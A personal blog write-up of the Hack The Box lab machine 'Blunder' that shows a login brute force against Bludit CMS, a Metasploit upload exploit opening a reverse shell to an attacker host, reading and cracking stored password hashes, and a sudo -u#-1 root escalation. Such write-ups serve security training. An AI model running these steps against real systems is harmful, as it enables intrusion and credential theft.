---
title: "HTB Blunder"
date: 2020-10-19 09:35:00 -0700
categories: [HTB, writeup]
tags: [writeup]
toc: true
---

> HTB Blunder: Linux Box with 4.2/10 Difficulty by egotisticalSW.

## Introduction

HTB Blunder is the first box where I managed to solve both the user flag and the root flag, and I'm excited so I decided to make a writeup! In the past, all of my writeups have been for small CTF challenges that can be solved within 4-5 minutes max, so writing up something as long as a full HTB challenge is definetely new to me. I am experimenting a bit in terms of categorization, although I hope the quality doesn't suffer too much. If this guide is helpful, great, glad it helped you! If it sucked, let me know how I can make it better. I am not the best when it comes to writing well and I'm using CTFs/HTB as a way to increase my writing skills.

With that out of the way, this is my guide for the challenge ``Blunder``. It took me around 5 hours to get the user flag, and it took me 15 minutes to get the root flag from there (very popular exploit was used.)

## Reconnaissance

### NMap

As usual with HTB, the first thing to do is to use nmap to scan the box. The IP of the box is ``10.10.10.191``, as you can see in the command I used:

``nmap -sC -sV -o nmap.nmap 10.10.10.191``

Here is the output of the scan: 

```
kali@kali:~/Desktop$ nmap -sC -sV 10.10.10.191
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-20 22:39 EDT
Nmap scan report for 10.10.10.191
Host is up (0.11s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.68 seconds
```

Alright, there is a web server, epic. Let's check it out:

![website](/assets/htb-blunder/website.PNG)

There isn't much to look at and there's only three blog posts..

### Dirbuster

My next move was to use dirbuster. I am bad so I'm still using the dirbuster GUI, although I will be using gobuster and wfuzz in the future.

I chose to scan with the file extension ``.txt`` on top of a normal directory search.

Here are the results:

![dirb](/assets/htb-blunder/dirb_results.PNG)

Cool, there's a ``todo`` page and an ``admin`` page. Let's check those out...

## Enumeration

![todo](/assets/htb-blunder/todo.PNG)

![login](/assets/htb-blunder/login.PNG)

From the todo page, it looks like we have a potential username, ``fergus``. It also hints that a ``CMS`` or ``content management system`` is in place.

From the admin page, we get the name of the CMS being used: ``Bludit``. 

I have a browser extension called Wappalyzer that told me the version of Bludit running on the web server.

![wappalyzer](/assets/htb-blunder/wappalyzer.PNG)

Epic, ``Bludit 3.9.2``. A quick google search tells us that this version is insecure as there are multiple vulnerabilities.

The first result on Google is for a ``Authentication Bruteforce Mitigation Bypass`` and that sounds promising as we have a login page and a username.

The next challenge comes in finding the credentials to brute force with. Luckily, I found that someone on a Discord server I frequent tried some of the longer wordlists without any luck, so my options were narrowed down from there. I could try out some of the more obscure seclists, or I could try making a custom wordlist using ``cewl``. I opted for the latter and made a wordlist with all the default options.

`` cewl -w wordlist.txt 10.10.10.191 ``

The exploit script came in ruby, and I was unable to get it to work. Thankfully, someone rewrote the exploit script in Python (https://github.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/tree/master) and it worked wonderfully. 

`` python3 exploit.py 10.10.10.191 fergus wordlist.txt ``

```
[*] Trying: Richard
[*] Trying: Bachman
[*] Trying: written
[*] Trying: approximately
[*] Trying: short
[*] Trying: stories
[*] Trying: collections
[*] Trying: Stoker
[*] Trying: British
[*] Trying: Society
[*] Trying: Foundation
[*] Trying: Distinguished
[*] Trying: Contribution
[*] Trying: Letters
[*] Trying: probably
[*] Trying: fictional
[*] Trying: character
[*] Trying: RolandDeschain

SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```

We now have credentials, epic. With this, we can make use of the second vulernability: https://www.cvedetails.com/cve/CVE-2019-16113/

In short, with these credentials, RCE is possible. I found a few different scripts/tools that let me make use of this exploit, however I decided to go with metasploit.

Here's how I did it:

First, enter the Metasploit Console:

```
kali@kali:~/Desktop/htb$ msfconsole
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
       =[ metasploit v5.0.87-dev                          ]
+ -- --=[ 2006 exploits - 1096 auxiliary - 343 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
Metasploit tip: Use the resource command to run commands from a file
msf5 > 
```

Cool. Next, we need to search for the exploit that we are going to use.

```
msf5 > search bludit
Matching Modules
================
   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability
```

Awesome, just what we were looking for! Let's set up Metasploit so that we can use this exploit.

```
msf5 > use exploit/linux/http/bludit_upload_images_exec
msf5 exploit(linux/http/bludit_upload_images_exec) > 
```

Alright, now we need to set the paramters for the exploit. In order to see everything that we can set, you want to use the command ``show options``.

```
Module options (exploit/linux/http/bludit_upload_images_exec):
   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS                   yes       The password for Bludit
   BLUDITUSER                   yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host
Exploit target:
   Id  Name
   --  ----
   0   Bludit v3.9.2
```

Great, we have everything we need to solve this out.

```
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
BLUDITPASS => RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus
msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 10.10.10.191
RHOSTS => 10.10.10.191
msf5 exploit(linux/http/bludit_upload_images_exec) > set LHOST x.x.x.x
LHOST => x.x.x.x
```

Note: the LHOST IP is your IP address after connecting to HTB's VPN. You can find this by typing ``ip address`` into your terminal and looking at the entry for the ``tun0`` interface.

Start the explot by typing ``exploit``. 

```
msf5 exploit(linux/http/bludit_upload_images_exec) > exploit
[*] Started reverse TCP handler on x.x.x.x:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading ngvFnJkGdF.png...
[*] Uploading .htaccess...
[*] Executing ngvFnJkGdF.png...
[*] Sending stage (38288 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (x.x.x.x:4444 -> 10.10.10.191:xxxxx) at 2020-09-21 18:20:52 -0400
[+] Deleted .htaccess
meterpreter > ls
Listing: /var/www/bludit-3.9.2/bl-content/tmp
=============================================
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  8054  fil   2020-09-21 13:17:40 -0400  47779.c
100644/rw-r--r--  100   fil   2020-09-21 12:36:18 -0400  hienqjmo.jpg
100644/rw-r--r--  128   fil   2020-09-21 12:15:49 -0400  lnnnbgkk.jpg
100644/rw-r--r--  121   fil   2020-09-21 12:14:23 -0400  ncxwzhxs.jpg
100644/rw-r--r--  2007  fil   2020-09-21 14:54:03 -0400  oklzkwxkdv.png
100600/rw-------  30    fil   2020-09-21 11:54:43 -0400  poc.php
40755/rwxr-xr-x   4096  dir   2020-09-21 16:35:20 -0400  temp
40755/rwxr-xr-x   4096  dir   2020-09-21 18:27:02 -0400  thumbnails
100644/rw-r--r--  2007  fil   2020-09-21 14:56:36 -0400  ucoghhcdok.png
```

POGGERS we are in. The shell isn't the greatest though, so we can use Python to spawn in a better one.

```
meterpreter > shell
Process 18095 created.
Channel 0 created.
python -c 'import pty; pty.spawn("/bin/sh")'
$ 
```

Now that we have a good shell, let's look around the machine. There are two users we have access to: 

```
$ cd /home/
cd /home/
$ ls
ls
hugo  shaun
$ 
```

Let's take a look at Hugo's files.

```
hugo
cd hugo
$ ls
ls
1.txt  3.txt  Desktop    Downloads  Pictures  Templates  user.txt
2.txt  4.php  Documents  Music      Public    Videos
$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

This is cringe, we can't access the ``user.txt`` file. Looks like we need to find a way into Hugo's account. Let's check out the files from the webserver we were on earlier.

```
$ cd /var/www/
cd /var/www/
$ ls
ls
bludit-3.10.0a  bludit-3.9.2  html
```

Hmm.. Two different versions. We were on 3-9-2, so let's take a look through those files.

```
cd bludit-3.9.2
cd bludit-3.9.2
$ ls
ls
LICENSE    bl-content  bl-languages  bl-themes  install.php
README.md  bl-kernel   bl-plugins    index.php  todo.txt
$ cd bl-content
cd bl-content
$ ls
ls
databases  pages  tmp  uploads  workspaces
$ cd databases
cd databases
$ ls
ls
/bin/sh: 9: sls: not found
$ ls
ls
categories.php  plugins       site.php    tags.php
pages.php       security.php  syslog.php  users.php
```

Now let's take a look at ``users.php``...

```
$ cat users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
```
usernames and hashes? epic!

I tried cracking the admin hash for way too long and got nothing out of it. The hash for fergus matched with the password we used with metasploit. 

So, nothing much in this version. Let's check the other version's file.

```
$ cat users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

A hash for hugo? Awesome, just what we needed.

``
faca404fd5c0a31cf1897b823c695c85cffeb98d
``

It's not salted, so let's try some rainbow tables. My favorite one is: https://crackstation.net/

Luckily, the password is there so there's no need to break out hashcat.

```
faca404fd5c0a31cf1897b823c695c85cffeb98d	sha1	Password120
```

Cool, now we have a username and a password. ``hugo:Password120``. Let's log in as Hugo.


```
$ su hugo
su hugo
Password: Password120

hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ 
```

And now let's try to print the users.txt file we saw earlier...

```
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat /home/hugo/user.txt
<10.0a/bl-content/databases$ cat /home/hugo/user.txt       
<removed>
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ 
```

And we get the user flag!

## Priv Escalation

Alright, now let's see what kinds of permissions Hugo has. 

```
der:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ 
```

A quick google search leads me to this page: https://www.exploit-db.com/exploits/47502

Let's try this out then!

```
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash
<-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash       
root@blunder:/var/www/bludit-3.10.0a/bl-content/databases# 
```

... that was easy. Now let's find the root flag..

```
root@blunder:/# cd /root/
root@blunder:/root# ls
root.txt
root@blunder:/root# cat root.txt
<omitted>
```

And the box is solved!

## Conclusion

I really did get lucky when it came to finding things on Google when I found them. If I overlooked some things or scrolled past the initial results too quickly, this box would have taken several more hours to get through. This was the first time I used Metasploit so figuring that out was cool, and this is the first time I was able to get the root flag on a box which is even better. In the future, I sort of have a better idea of what methodology I should be using, including upgrading some of the tools that I have been using, so hopefully I can solve things a little bit faster in the future.














